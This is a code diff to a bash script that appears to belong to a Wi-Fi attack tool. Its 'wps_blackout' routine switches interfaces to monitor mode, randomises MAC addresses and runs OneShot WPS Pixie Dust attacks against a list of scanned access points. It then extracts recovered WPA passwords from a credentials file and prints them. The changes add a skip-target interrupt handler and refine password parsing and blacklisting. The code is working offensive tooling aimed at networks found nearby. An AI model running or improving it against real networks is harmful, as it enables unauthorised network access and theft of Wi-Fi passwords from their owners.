@@ -8,13 +8,6 @@ ssid_config="config/ssid.txt"
 settings_file="config/settings.conf"
 source $settings_file
 
-trap ctrl_c INT
-
-function ctrl_c() {
-    printf "\n\n\e[0m[\e[91m!\e[0m] Ctrl+C detected! Use menu keys to exit...\n"
-    back_to_menu
-}
-
 check_root(){
     banner
     if [[ $EUID -ne 0 ]]; then
@@ -243,32 +236,15 @@ esac
 
 }
 
-set_managed() {
+if_busy(){
     iface=$1
-    printf "\n\e[0m[\e[93m*\e[0m] Putting \e[92m$iface\e[0m in managed mode... \n"
-    ip link set $iface down
-    iw $iface set type managed 
-    ip link set $iface up
-    printf "\n\e[0m[\e[92mi\e[0m] Enabled managed mode on \e[92m$iface\e[0m! \n"
-
-}
-
-set_mmode(){
-    iface=$1
-    printf "\n\e[0m[\e[93m*\e[0m] Putting \e[92m$iface\e[0m in monitor mode... \n"
-    ip link set $iface down
-    iw $iface set monitor control
-    ip link set $iface up
-    printf "\n\e[0m[\e[92mi\e[0m] Enabled monitor mode on \e[92m$iface\e[0m! \n"
-}
-
-iface_macchanger(){
-    iface=$1
-    ip link set $iface down
-    sleep 0.5
-    macchanger -r $iface &>/dev/null
-    sleep 0.5
-    ip link set $iface up
+    if [ $(! ip route | grep -qoP "default via .+ dev $iface") ];
+    then
+        printf "\n\e[0m[\e[91m!\e[0m] Interface \e[92m$iface\e[0m is busy!\n"
+        wait_for $iface
+    else
+        printf "\n\e[0m[\e[92mi\e[0m] Interface \e[92m$iface\e[0m is ready to go!\n"
+    fi
 }
 
 wait_for(){
@@ -281,7 +257,67 @@ wait_for(){
     done
     }
 
+set_managed() {
+    iface=$1
+    printf "\n\e[0m[\e[93m*\e[0m] Putting \e[92m$iface\e[0m in managed mode... \n"
+    ip link set $iface down
+    iw $iface set type managed 
+    ip link set $iface up
+    if_busy $iface
+    printf "\n\e[0m[\e[92mi\e[0m] Enabled managed mode on \e[92m$iface\e[0m! \n"
+
+}
+
+set_mmode(){
+    iface=$1
+    printf "\n\e[0m[\e[93m*\e[0m] Putting \e[92m$iface\e[0m in monitor mode... \n"
+    ip link set $iface down
+    iw $iface set monitor control
+    ip link set $iface up
+    if_busy $iface
+    printf "\n\e[0m[\e[92mi\e[0m] Enabled monitor mode on \e[92m$iface\e[0m! \n"
+}
+
+iface_macchanger(){
+    iface=$1
+    ip link set $iface down
+    # sleep 0.5
+    macchanger -r $iface &>/dev/null
+    # sleep 0.5
+    ip link set $iface up
+}
+
 wps_blackout(){
+
+    trap ctrl_c INT
+    function ctrl_c() {
+        printf "\n\e[0m[\e[91m!\e[0m] [ Ctrl+C detected! \e[92ms\e[0m - skip target, \e[92mm\e[0m - menu, \e[92me\e[0m - exit script: ]\n\n"
+        read -p "Choice: " ctrl_c_while
+
+        case $ctrl_c_while in
+
+        [sS]|[sS][kK][iI][pP])
+            skipmode=1
+            printf "\n\e[0m[\e[93m*\e[0m] Skipping target... \n"
+            ;;
+        [eE]|[eE][xX][iI][tT])
+            printf "\n\e[0m[\e[93m*\e[0m] Exiting... \n"
+            exit
+            ;;
+        [mM]|[mM][eE][nN][uU])
+            printf "\n\e[0m[\e[93m*\e[0m] Backing to menu... \n"
+            sleep 2
+            blackout_menu
+            ;;
+        *)
+            printf "\n\e[0m[\e[93m*\e[0m] Backing to menu... \n"
+            sleep 2
+            blackout_menu
+            ;;
+        esac
+
+    }
+
     banner
     chk_iface $first_iface
     printf "\n\e[0m[\e[93m*\e[0m] Starting blackout... \n"
@@ -401,26 +437,35 @@ fi
         
         python3 $(pwd)/config/OneShot/oneshot.py -i $first_iface -b ${target_bssid[$y]} -K -F -w
 
-        if [ ! -e $creds_path ];
-        then
-            printf "\n\e[0m[\e[91m!\e[0m] stored.txt not generated yet, or $creds_path is invaild! \n"
-        else
-            psk=$(cat $creds_path | awk '/BSSID: '${target_bssid[$y]}'/ {p = 4} p > 0 {print $0; p--}')
-            if printf $psk | grep -q "BSSID";
+        if [ $skipmode == 1 ];
             then
-                printf "\n\e[0m[\e[92mi\e[0m] Found ${target_ssid[$y]} password! \n"
-                printf "\n\e[92m$psk\e[0m"
+            printf "\n\e[0m[\e[92mi\e[0m] Skipped!"
+            skipmode=0
+        else
+            # stage1 - check creds file exist
+            if [ ! -e $creds_path ];
+            then
+                printf "\n\e[0m[\e[91m!\e[0m] stored.txt not generated yet, or $creds_path is invaild! \n"
             else
-                printf "\n\e[0m[\e[91m!\e[0m] ${target_ssid[$y]} password not found! \n"
-                printf "\n\e[0m[\e[93m*\e[0m] Adding ${target_bssid[$y]} to blacklist... \n"
-                if grep -Fxq "${target_bssid[$y]}" $blacklist_path
+                # stage2 - check creds are saved to file
+                psk=$(cat -v $creds_path | awk -v var="${target_bssid[$y]}" '$1 == "BSSID:" && $2 == var {p = 4} p > 0 {print $0; p--}' < $creds_path)
+                if $(printf $psk | grep -q "BSSID");
                 then
-                    printf "\n\e[0m[\e[92mi\e[0m] BSSID is already in blacklist!"  
+                    printf "\n\e[0m[\e[92mi\e[0m] Found ${target_ssid[$y]} password! \n"
+                    printf "\n\e[92m$psk\e[0m\n"
                 else
-                    printf ${target_bssid[$y]} >> $blacklist_path
-                    printf "\n\e[0m[\e[92mi\e[0m] Added!"  
+                    # if not, add ssid to blacklist
+                    printf "\n\e[0m[\e[91m!\e[0m] ${target_ssid[$y]} password not found! \n"
+                    printf "\n\e[0m[\e[93m*\e[0m] Adding ${target_bssid[$y]} to blacklist... \n"
+                    # check if bssid is already here
+                    if grep -Fxq "${target_bssid[$y]}" $blacklist_path
+                    then
+                        printf "\n\e[0m[\e[92mi\e[0m] BSSID is already in blacklist!"  
+                    else
+                        printf '%s\n' "${target_bssid[$y]}" >> $blacklist_path
+                        printf "\n\e[0m[\e[92mi\e[0m] Added!"  
+                    fi
                 fi
-
             fi
         fi
         
@@ -429,7 +474,7 @@ fi
 
             if [ $y -lt $((${#target_bssid[@]}-1)) ];
             then
-            printf "\n\n\e[0m[\e[92mi\e[0m] Press [ENTER] to continue...\n"
+            printf "\n\e[0m[\e[92mi\e[0m] Press [ENTER] to continue...\n"
             read ener_empty_value
             fi
         fi
@@ -479,7 +524,7 @@ fi
     set_managed $second_iface
 
     wait_for $second_iface
-
+    
     tput sc
     x=0
     while [ $x -lt $scan_accuracy ]
